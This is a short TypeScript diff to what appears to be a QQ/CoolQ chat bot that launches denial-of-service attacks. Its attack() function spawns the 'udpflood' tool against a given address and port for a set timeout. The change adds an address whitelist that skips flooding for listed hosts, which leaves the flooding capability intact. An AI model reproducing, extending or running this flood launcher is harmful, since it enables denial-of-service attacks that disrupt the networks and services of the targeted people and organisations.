@@ -18,6 +18,7 @@ interface Config {
 	coolq: CoolQConfig;
 	floodQQGroups: Array<number>;
 	attackTimeout: number;
+	addressWhitelist: string[]
 }
 
 const log = bunyan.createLogger({
@@ -33,6 +34,12 @@ function sleep(time: number): Promise<void> {
 };
 
 function attack(address: string, port: number): Promise<void> {
+	if (_.contains(config.addressWhitelist, address)) {
+		log.info(`Attack of ${address}:${port} skipped.`);
+		return new Promise((done) => {
+			done();
+		})
+	}
 	log.info(`Attack of ${address}:${port} started.`);
 	const attackProcess = spawn("udpflood", ["-t", address, "-p", port.toString()]);
 	setTimeout(() => {
